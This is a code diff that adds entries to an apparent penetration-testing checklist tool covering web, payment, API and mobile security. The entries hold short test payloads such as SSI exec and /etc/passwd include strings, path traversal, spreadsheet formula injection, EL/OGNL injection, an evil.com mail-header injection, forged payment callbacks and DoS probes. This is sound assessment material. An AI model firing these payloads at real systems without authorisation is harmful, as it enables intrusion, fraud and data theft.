@@ -297,6 +297,9 @@ const web = {
         { kind: 'input', title: 'Record the base tech stack and versions you confirmed', detail: 'Anchor the rest of the test on this: server, framework, language, CMS, front-end, CDN.', payloads: [] },
         { kind: 'question', title: 'Authenticated testing in scope? Which roles/accounts?', detail: 'Note every role you were issued — access-control testing needs at least two accounts at the same level.', payloads: [] },
         { kind: 'check', title: 'Rate limiting / bot protection baseline', detail: 'Establish early what will throttle you, so later findings are not just "blocked".', payloads: ['send 50 requests and watch for 429 / challenge'] },
+        { kind: 'check', title: 'Different content by User-Agent', detail: 'Mobile sites and crawler-facing versions are often older, less hardened and separately routed.', payloads: ['curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)" {url}', 'curl -A "Googlebot/2.1 (+http://www.google.com/bot.html)" {url}', 'diff the two responses'] },
+        { kind: 'input', title: 'Which channels exist for the same application?', detail: 'Web, mobile web, mobile app, desktop client, partner API — each is its own attack surface over the same data.', payloads: [] },
+        { kind: 'check', title: 'Co-hosted and related applications', detail: 'Anything sharing the host or origin inherits your foothold; a weak neighbour is a way in.', payloads: ['reverse IP lookup', 'other vhosts on the same certificate SANs'] },
       ]
     },
     {
@@ -310,6 +313,9 @@ const web = {
         { kind: 'check', title: 'Mine JS bundles for endpoints & secrets', detail: 'The client tells you the whole API surface, including admin routes the UI hides.', payloads: ['grep -roE "(/[a-zA-Z0-9_-]+){2,}" *.js | sort -u', 'trufflehog filesystem ./js', 'linkfinder / jsluice'] },
         { kind: 'trigger', title: 'Any endpoint returning 401/403 worth bypassing?', detail: 'Forbidden usually means it exists and matters.', spawns: 'bypass403', payloads: [] },
         { kind: 'check', title: 'Cloud storage buckets referenced by the app', detail: 'S3/GCS/Azure blobs in HTML, JS and image URLs; test list/read/write.', payloads: ['grep -riE "s3\\.amazonaws|blob\\.core|storage\\.googleapis" .', 'aws s3 ls s3://<bucket> --no-sign-request'] },
+        { kind: 'check', title: 'Cross-domain policy files', detail: 'A permissive policy lets other origins read authenticated responses.', payloads: ['{url}/crossdomain.xml', '{url}/clientaccesspolicy.xml', 'look for <allow-access-from domain="*"/>'] },
+        { kind: 'check', title: 'File-extension handling', detail: 'The same file under another extension may be served as source instead of executed.', payloads: ['login.php.bak, .old, .inc, .txt, .swp, ~', 'web.config, .env.example, config.php.save'] },
+        { kind: 'trigger', title: 'Non-production data or debug builds in production?', detail: 'Test accounts, seeded customers, verbose builds and staging endpoints reachable from prod — and real data sitting in staging.', spawns: 'nonprod', payloads: [] },
       ]
     },
     {
@@ -323,6 +329,12 @@ const web = {
         { kind: 'check', title: 'Logout, idle timeout & concurrent sessions', detail: 'Is the token actually invalidated server-side, or just dropped client-side?', payloads: ['replay the old cookie after logout'] },
         { kind: 'check', title: 'Remember-me / persistent token design', detail: 'Predictable or non-expiring long-lived tokens.', payloads: ['decode the remember-me cookie'] },
         { kind: 'check', title: 'Account lockout & anti-automation', detail: 'Both directions: no lockout (brute force) and lockout that enables user-enumeration or DoS.', payloads: [] },
+        { kind: 'check', title: 'CAPTCHA implementation', detail: 'Verify server-side, single-use and actually required — most CAPTCHA bugs are a reusable token or a response you can simply omit.', payloads: ['replay the same captcha token twice', 'remove the captcha parameter entirely', 'check whether the answer is validated client-side'] },
+        { kind: 'check', title: 'Password change process', detail: 'Distinct from reset: does it demand the current password, and does it invalidate other sessions?', payloads: ['change password without supplying the old one', 'reuse an old session afterwards'] },
+        { kind: 'check', title: 'Credentials and tokens only over HTTPS', detail: 'Login form served over HTTP, mixed content, or a session cookie without Secure — all give the token away on the wire.', payloads: ['curl http://{domain}/login -i', 'check Secure flag on the session cookie', 'grep the page for http:// subresources'] },
+        { kind: 'check', title: 'Authentication history & active session list', detail: 'Can a user see recent logins and revoke other sessions? Its absence hides an account takeover.', payloads: [] },
+        { kind: 'check', title: 'Out-of-band notification of security events', detail: 'Email/SMS on password change, email change, lockout and new-device login. Silence lets a takeover persist.', payloads: [] },
+        { kind: 'check', title: 'Cache headers on authenticated pages', detail: 'Without no-store, private pages sit in the browser cache and in shared proxies.', payloads: ['curl -sI {url}/account | grep -iE "cache-control|pragma|expires"', 'browser back button after logout'] },
       ]
     },
     {
@@ -340,12 +352,19 @@ const web = {
         { kind: 'check', title: 'CRLF injection / response splitting', detail: 'Header injection in redirects and logging.', payloads: ['%0d%0aSet-Cookie:%20x=1', '%0d%0a%0d%0a<script>alert(1)</script>'] },
         { kind: 'check', title: 'CSV / formula injection in exports', detail: 'Stored input rendered into an exported spreadsheet, executed on the victim workstation.', payloads: ['=cmd|\' /C calc\'!A0', '@SUM(1+1)*cmd|\' /C calc\'!A0'] },
         { kind: 'check', title: 'Mail header injection / SMTP smuggling in contact forms', detail: '', payloads: ['name=x%0aBcc:attacker@evil.com'] },
+        { kind: 'check', title: 'ORM injection', detail: 'The ORM is only safe until raw fragments, sort/filter strings or field names come from the user.', payloads: ['?sort=id;--', '?filter[where][or][0][x]=1', 'Sequelize/TypeORM raw where clauses'] },
+        { kind: 'check', title: 'Server-Side Includes (SSI) injection', detail: 'Where .shtml or SSI-enabled handlers reflect input.', payloads: ['<!--#exec cmd="id"-->', '<!--#include virtual="/etc/passwd"-->'] },
+        { kind: 'check', title: 'Expression Language / OGNL injection', detail: 'Java stacks: EL in JSF/JSP and OGNL in Struts reach RCE the way SSTI does.', payloads: ['${7*7}', '#{7*7}', '%{(1+1)}', "${''.getClass().forName('java.lang.Runtime')}"] },
+        { kind: 'check', title: 'HTTP parameter pollution', detail: 'Duplicate parameters are merged differently by the proxy, the framework and the backend — the disagreement is the bug.', payloads: ['?id=1&id=2', '?role=user&role=admin', 'mix query string and body params of the same name'] },
+        { kind: 'check', title: 'Compare client-side and server-side validation', detail: 'Every rule enforced only in JavaScript is a rule that is not enforced. Submit past each one directly.', payloads: ['strip maxlength/pattern and resubmit', 'send values the UI cannot produce (negative, huge, wrong type)'] },
       ]
     },
     {
       key: 'upload', title: '5. File Upload & Handling', items: [
         { kind: 'trigger', title: 'Is there a file upload?', detail: 'Avatar, document, import, attachment. Run the upload attack checklist.', spawns: 'upload', payloads: [] },
         { kind: 'check', title: 'File download / path traversal', detail: 'download?file=, export, view endpoints.', payloads: ['?file=../../../../etc/passwd', '?file=..%2f..%2f..%2fetc%2fpasswd', 'C:\\windows\\win.ini'] },
+        { kind: 'check', title: 'Are uploads served from the application origin?', detail: 'User content on the same origin turns any stored HTML/SVG into same-origin script. It belongs on a separate host.', payloads: ['check the host serving /uploads/', 'is Content-Disposition: attachment set?'] },
+        { kind: 'check', title: 'Access control on stored files', detail: 'Uploaded files are objects too: guessable names or missing authz expose other tenants documents.', payloads: ['fetch another user file id', 'sequential or predictable filenames'] },
       ]
     },
     {
@@ -355,10 +374,14 @@ const web = {
         { kind: 'check', title: 'Mass assignment', detail: 'Add unexpected fields (isAdmin, role, verified) to update requests.', payloads: ['{"...","role":"admin"}', '{"...","is_admin":true}'] },
         { kind: 'check', title: 'Business logic flaws', detail: 'Negative quantities, price tampering, coupon reuse, step skipping, currency rounding.', payloads: ['negative amount', 'replay a signed request', 'skip step 2 and post step 3 directly'] },
         { kind: 'trigger', title: 'Any limited/one-shot action worth racing?', detail: 'Coupons, withdrawals, invites, vote/like, MFA attempts, stock reservation.', spawns: 'race', payloads: [] },
+        { kind: 'trigger', title: 'Is there a payment or checkout flow?', detail: 'Money moves here, so logic bugs are worth real severity.', spawns: 'payment', payloads: [] },
         { kind: 'check', title: 'Horizontal privilege escalation across tenants', detail: 'Multi-tenant apps: swap org/tenant id while keeping your own user id.', payloads: ['change X-Tenant-Id / org_id in body, path and header'] },
         { kind: 'check', title: 'Parameter-based role/state in the request', detail: 'role, isAdmin, price, status, userId sent from the client and trusted.', payloads: ['diff a normal-user request against an admin one'] },
         { kind: 'check', title: 'Unprotected admin/internal endpoints', detail: 'Forced browsing, and the same route on an internal port/host.', payloads: ['ffuf -u {url}/admin/FUZZ -w admin-panels.txt'] },
         { kind: 'check', title: 'Export / bulk endpoints leaking other users', detail: 'CSV/PDF/report generators often skip the per-row ACL.', payloads: [] },
+        { kind: 'check', title: 'Segregation of duties', detail: 'Can one account both create and approve? Request and authorise? That is a finding even when every endpoint checks a role.', payloads: ['approve your own request', 'self-grant a privilege'] },
+        { kind: 'check', title: 'Audit trail & non-repudiation', detail: 'Are privileged and financial actions logged with actor, time and before/after, and can a user erase their own trail?', payloads: ['perform an admin action, then look for it in any visible log'] },
+        { kind: 'check', title: 'Integrity of data in transit through the client', detail: 'Prices, totals, quantities and signatures that round-trip via the browser must be re-derived server-side.', payloads: ['change a price/total in the request', 'replay a signed order with a modified body'] },
       ]
     },
     {
@@ -372,6 +395,10 @@ const web = {
         { kind: 'check', title: 'DOM XSS: map sources to sinks', detail: 'location/hash/postMessage → innerHTML/eval/document.write.', payloads: ['DOM Invader (Burp)', 'grep for innerHTML, eval, document.write, setTimeout(str)'] },
         { kind: 'check', title: 'postMessage / iframe & clickjacking', detail: 'Missing origin checks in message handlers; missing frame-ancestors.', payloads: ['window.postMessage("{}","*") from an attacker frame', 'curl -sI {url} | grep -iE "x-frame|frame-ancestors"'] },
         { kind: 'check', title: 'WebSocket authentication & message authorization', detail: 'Origin not validated on the handshake (CSWSH); no per-message authz.', payloads: ['connect from an off-origin page with the victim cookie', 'replay another user\'s message ids'] },
+        { kind: 'check', title: 'Session puzzling / variable overloading', detail: 'One session variable reused by two flows — set it through the weak flow (reset, registration) and walk into the strong one authenticated.', payloads: ['start password reset, then request an authenticated page', 'begin registration and jump to a post-login route'] },
+        { kind: 'check', title: 'Null, malformed and foreign session cookies', detail: 'The server should reject them cleanly, not fall back to an anonymous-but-privileged state or throw a stack trace.', payloads: ['sid=', 'sid=null', 'sid=<valid token from another app on the domain>'] },
+        { kind: 'check', title: 'Service worker & offline cache', detail: 'A service worker is a persistent proxy for the origin: check its scope, its cache contents and whether a stored XSS can register one.', payloads: ['chrome://serviceworker-internals', 'look for sensitive responses in Cache Storage', 'can any upload be served from the origin as JS?'] },
+        { kind: 'check', title: 'Sensitive data in web storage', detail: 'localStorage and sessionStorage are readable by any script on the origin and survive logout.', payloads: ['devtools → Application → Storage', 'look for tokens, PII and keys; re-check after logout'] },
       ]
     },
     {
@@ -382,6 +409,18 @@ const web = {
         { kind: 'check', title: 'Dependency confusion / subresource integrity', detail: 'Internal package names published publicly; script tags without SRI on third-party hosts.', payloads: ['check package.json / lockfiles for internal scopes', 'grep for <script src="//"'] },
         { kind: 'check', title: 'Known-CVE sweep against the confirmed stack', detail: 'Do this after fingerprinting, so it is targeted rather than noise.', payloads: ['nuclei -u {url} -s critical,high', 'searchsploit <product> <version>'] },
         { kind: 'check', title: 'TLS configuration & certificate validity', detail: 'Weak ciphers, TLS 1.0/1.1, expired or wildcard certs, missing HSTS.', payloads: ['sslscan {domain}', 'testssl.sh {domain}'] },
+        { kind: 'check', title: 'Application-level denial of service', detail: 'Cheap request, expensive response. Agree the blast radius with the client before testing any of this.', payloads: ['ReDoS: catastrophic backtracking in a search/validation regex', 'SQL wildcard: ?q=%_%_%_%_%', 'huge JSON depth / zip bomb / 100MB upload', 'slowloris-style slow headers'] },
+        { kind: 'check', title: 'Error handling & information disclosure', detail: 'Force failures everywhere and read what comes back: stack traces, SQL, internal hostnames, framework versions.', payloads: ['wrong types, oversized values, malformed JSON', 'unhandled 500 vs handled 400'] },
+      ]
+    },
+    {
+      key: 'crypto', title: '9. Cryptography & Secrets', items: [
+        { kind: 'check', title: 'Is data that should be encrypted actually encrypted?', detail: 'Card numbers, tokens, health and identity data at rest and in transit — including internal hops the client never sees.', payloads: ['check the DB/backup/export for plaintext', 'internal service calls over plain HTTP'] },
+        { kind: 'check', title: 'Weak or misapplied algorithms', detail: 'MD5/SHA1 for integrity, DES/RC4, ECB mode, or a strong cipher used without authentication.', payloads: ['identical plaintext blocks → identical ciphertext (ECB)', 'grep the client bundle for CryptoJS/AES usage'] },
+        { kind: 'check', title: 'Password storage: hashing and salting', detail: 'If any hash leaks, its format tells you the cost. bcrypt/scrypt/argon2 with a per-user salt, not sha256(password).', payloads: ['look at leaked hashes from any other finding', 'ask for the hashing scheme in the report'] },
+        { kind: 'check', title: 'Predictable tokens and identifiers', detail: 'Reset tokens, invites, API keys and object ids built from time, counters or Math.random() are guessable.', payloads: ['collect 50 tokens and diff them', 'check for timestamp or sequence structure'] },
+        { kind: 'check', title: 'Key management', detail: 'Hardcoded keys in the client, one key for everything, no rotation, keys in the repo or in environment dumps.', payloads: ['grep bundles and config for key material', 'check whether the same key signs and encrypts'] },
+        { kind: 'check', title: 'Encoding mistaken for encryption', detail: 'base64, hex and ROT-style obfuscation used to protect a value that then becomes trivially forgeable.', payloads: ['decode every opaque parameter and cookie'] },
       ]
     },
   ],
@@ -459,6 +498,28 @@ const web = {
         { kind: 'check', title: 'Cache deception (steal authenticated pages)', detail: 'Trick the cache into storing a victim\'s private page under a static-looking path.', payloads: ['{url}/account/profile.css', '{url}/account%0a.js', '{url}/account/;x.css'] },
         { kind: 'check', title: 'Fat GET / method and parameter cloaking', detail: '', payloads: ['GET with a body', '?utm_content=x&callback=alert'] },
         { kind: 'check', title: 'DoS by caching an error response', detail: 'Poisoning a 400 into the cache takes the page down for everyone — confirm scope allows this before testing.', payloads: ['oversized header → cached 400'] },
+      ]
+    },
+    payment: {
+      title: 'Payment & checkout checklist', items: [
+        { kind: 'check', title: 'Price, quantity and currency tampering', detail: 'Anything the client sends about money must be re-derived server-side from the catalogue.', payloads: ['negative quantity to create a credit', 'price=0.01 in the add-to-cart or confirm call', 'switch currency between quote and capture'] },
+        { kind: 'check', title: 'Discounts, coupons and gift cards', detail: 'Stacking, reuse past the limit, applying after totals are computed, racing the redemption.', payloads: ['apply the same code twice in parallel', 'apply a code to an already-confirmed order'] },
+        { kind: 'check', title: 'Step skipping in the checkout state machine', detail: 'Reach confirmation without paying, or mark an order paid by calling the success callback yourself.', payloads: ['POST the success/return URL directly', 'skip from cart to fulfilment'] },
+        { kind: 'check', title: 'Payment-gateway callback integrity', detail: 'Webhooks and return URLs must be signature-verified and replay-protected — this is where "free orders" usually live.', payloads: ['forge the provider callback with status=paid', 'replay a genuine callback for a second order'] },
+        { kind: 'check', title: 'Refunds, cancellations and partial captures', detail: 'Refund more than was paid, refund twice, cancel after fulfilment.', payloads: ['refund amount > order total'] },
+        { kind: 'check', title: 'Card data handling and PCI exposure', detail: 'Is the PAN ever touching the client\'s own servers or logs? Confirm tokenisation and that CVV is never stored.', payloads: ['search responses/logs for PAN patterns', 'check whether the form posts to the gateway or to the app'] },
+        { kind: 'check', title: 'Stored payment methods and IDOR', detail: 'Can you charge, read or delete another user\'s saved card or address?', payloads: ['swap the payment-method id'] },
+        { kind: 'check', title: 'Test vs live keys and non-production data', detail: 'Sandbox keys in production (or the reverse) let you transact for free — or expose real customers.', payloads: ['look for pk_test/sk_test in the bundle'] },
+      ]
+    },
+    nonprod: {
+      title: 'Non-production exposure checklist', items: [
+        { kind: 'question', title: 'What did you find, and on which host?', detail: 'Record the exact hostname and how you reached it.', payloads: [] },
+        { kind: 'check', title: 'Real customer data in a non-production environment', detail: 'A staging copy of the production database is a breach waiting to happen, and usually far less protected.', payloads: ['do the records look real? names, emails, orders'] },
+        { kind: 'check', title: 'Test accounts and seeded users in production', detail: 'test/test, demo users, QA accounts — often with elevated roles and weak passwords.', payloads: ['try test@, qa@, demo@, admin@ with obvious passwords'] },
+        { kind: 'check', title: 'Debug builds, verbose errors and dev toggles', detail: 'Source maps, debug flags in the query string, framework debug panels.', payloads: ['?debug=1', '?test=true', 'look for *.js.map'] },
+        { kind: 'check', title: 'Weaker controls on the non-production host', detail: 'Same app, no WAF, no MFA, older build — use it to develop the attack, then check whether it also works on prod.', payloads: [] },
+        { kind: 'check', title: 'Shared infrastructure with production', detail: 'Same database, same secrets, same cloud role — then staging is production for exploitation purposes.', payloads: ['do credentials found here work against prod?'] },
       ]
     },
     bypass403: {
@@ -926,6 +987,7 @@ const api = {
     {
       key: 'ops', title: '5. Rate Limiting, Inventory & Config', items: [
         { kind: 'check', title: 'Unrestricted resource consumption (API4)', detail: 'No rate limit, no pagination cap, expensive queries, large uploads, SMS/email cost amplification.', payloads: ['limit=1000000', 'trigger the OTP-send endpoint in a loop'] },
+        { kind: 'check', title: 'Unrestricted access to sensitive business flows (API6)', detail: 'The endpoint works exactly as designed, but nothing stops automation of the flow itself: buying the whole stock, mass-booking, farming referrals, scraping the entire catalogue. Ask what the business loses if one actor runs this a million times.', payloads: ['script the full purchase/booking flow end to end', 'enumerate every object through a paginated list', 'redeem referral or trial signup repeatedly'] },
         { kind: 'check', title: 'Rate-limit bypass', detail: '', payloads: ['X-Forwarded-For rotation', 'case/path variation: /API/v1/x', 'batch or array requests'] },
         { kind: 'check', title: 'Improper inventory management (API9)', detail: 'Undocumented, deprecated and shadow endpoints still serving production data.', payloads: ['compare the spec against observed traffic'] },
         { kind: 'check', title: 'CORS policy', detail: 'Reflected Origin with credentials on an API is direct data theft.', payloads: ['curl -H "Origin: https://evil.com" -i {base}/me', 'test null origin'] },
@@ -974,6 +1036,9 @@ const mobile = {
         { kind: 'check', title: 'WebView configuration', detail: 'JavaScriptInterface, file access, mixed content, loading attacker-controlled URLs.', payloads: ['grep -r addJavascriptInterface', 'setAllowFileAccessFromFileURLs', 'shouldOverrideUrlLoading logic'] },
         { kind: 'check', title: 'Cryptography usage', detail: 'Hardcoded keys/IVs, ECB mode, custom crypto, weak random, keys not in the Keystore/Secure Enclave.', payloads: ['grep -rE "AES/ECB|DES|MD5|SHA1|new Random\\("'] },
         { kind: 'check', title: 'Third-party SDKs & dependency vulnerabilities', detail: 'Analytics and ad SDKs also decide where user data goes.', payloads: ['dependency-check', 'review the SDK list in MobSF output'] },
+        { kind: 'check', title: 'Minimum platform version (MASVS-CODE-1)', detail: 'A low minSdkVersion or deployment target silently disables the OS protections the rest of the app assumes.', payloads: ['grep minSdkVersion in the manifest', 'MinimumOSVersion in Info.plist'] },
+        { kind: 'check', title: 'Network security config / ATS (MASVS-NETWORK-1)', detail: 'Cleartext permitted, user CAs trusted, or blanket ATS exceptions — each one hands you the traffic.', payloads: ['res/xml/network_security_config.xml', 'NSAllowsArbitraryLoads in Info.plist', 'cleartextTrafficPermitted="true"'] },
+        { kind: 'check', title: 'Code obfuscation & anti-static analysis (MASVS-RESILIENCE-3)', detail: 'Not a control on its own, but its absence means every check below is trivially locatable.', payloads: ['is the code ProGuard/R8/DexGuard processed?', 'are strings and endpoints in cleartext?'] },
       ]
     },
     {
@@ -986,6 +1051,10 @@ const mobile = {
         { kind: 'check', title: 'Data at rest after real use', detail: 'Log in, use the app, then re-inspect storage, logs and screenshots/backgrounding cache.', payloads: ['adb logcat | grep -i <pkg>', 'adb backup -f b.ab <pkg>', 'check the snapshot cache on backgrounding'] },
         { kind: 'check', title: 'IPC abuse from a malicious app', detail: 'Prove impact by writing a small PoC app that calls the exported component.', payloads: ['drozer modules', 'PoC APK invoking the provider'] },
         { kind: 'check', title: 'Clipboard, keyboard cache, accessibility & screenshots', detail: '', payloads: ['is FLAG_SECURE set on sensitive screens?'] },
+        { kind: 'check', title: 'Debugger, emulator and hooking detection (MASVS-RESILIENCE-4)', detail: 'Does the app notice frida, an emulator or an attached debugger — and what does it do about it?', payloads: ['attach with frida and watch for a reaction', 'run on an emulator', 'set android:debuggable and attach jdb'] },
+        { kind: 'check', title: 'Platform integrity attestation (MASVS-RESILIENCE-1)', detail: 'Play Integrity / DeviceCheck / App Attest — and crucially whether the verdict is checked server-side or just locally.', payloads: ['hook the local verdict check and flip it', 'does the backend reject an untrusted device?'] },
+        { kind: 'check', title: 'Step-up authentication for sensitive actions (MASVS-AUTH-3)', detail: 'Transfers, profile/email changes and payment-method edits should re-authenticate, not ride the session.', payloads: ['perform a sensitive action with an old session'] },
+        { kind: 'check', title: 'Leakage through logs, backups and crash reports (MASVS-STORAGE-2)', detail: 'Tokens and PII in logcat, in adb backups, or shipped to a crash-reporting SDK.', payloads: ['adb logcat | grep -iE "token|password|authorization"', 'adb backup -f b.ab <pkg>', 'check the crash-reporter payload in the proxy'] },
       ]
     },
     {
@@ -996,6 +1065,16 @@ const mobile = {
         { kind: 'check', title: 'Push notification & device registration abuse', detail: '', payloads: ['register another user\'s device token'] },
         { kind: 'check', title: 'In-app purchase / receipt validation', detail: 'Receipts validated on-device only can be forged.', payloads: [] },
         { kind: 'check', title: 'Privacy: what data leaves the device, and to whom', detail: 'Third-party analytics receiving PII is a reportable issue.', payloads: ['review all outbound hosts in the proxy log'] },
+      ]
+    },
+    {
+      key: 'privacy', title: '4. Privacy & Update Posture', items: [
+        { kind: 'check', title: 'Data minimisation & permissions (MASVS-PRIVACY-1)', detail: 'Every permission and every field collected should be justified by a feature the user asked for.', payloads: ['list requested permissions against actual functionality', 'are location/contacts/camera really needed?'] },
+        { kind: 'check', title: 'Identifiers and fingerprinting (MASVS-PRIVACY-2)', detail: 'Persistent hardware identifiers and cross-app fingerprinting let the user be tracked beyond the account.', payloads: ['grep for ANDROID_ID, IMEI, advertising id, identifierForVendor'] },
+        { kind: 'check', title: 'Consent before collection (MASVS-PRIVACY-3)', detail: 'Watch the proxy from first launch: SDKs that phone home before the consent dialog is answered are the common finding.', payloads: ['capture traffic on a fresh install, before accepting anything'] },
+        { kind: 'check', title: 'User control over their data (MASVS-PRIVACY-4)', detail: 'Account deletion and data export that actually work, end to end.', payloads: ['delete the account, then try to log back in', 'does the backend still return the data?'] },
+        { kind: 'check', title: 'Forced-update mechanism (MASVS-CODE-2)', detail: 'Without one, a patched vulnerability stays exploitable on every device that never updates.', payloads: ['pin an old version and see whether the backend still serves it'] },
+        { kind: 'check', title: 'Key management (MASVS-CRYPTO-2)', detail: 'Keys in the Keystore/Secure Enclave with proper access flags, derived from a real KDF, not hardcoded or derived from a device id.', payloads: ['grep for SecretKeySpec with a literal', 'check setUserAuthenticationRequired on the key'] },
       ]
     },
   ],
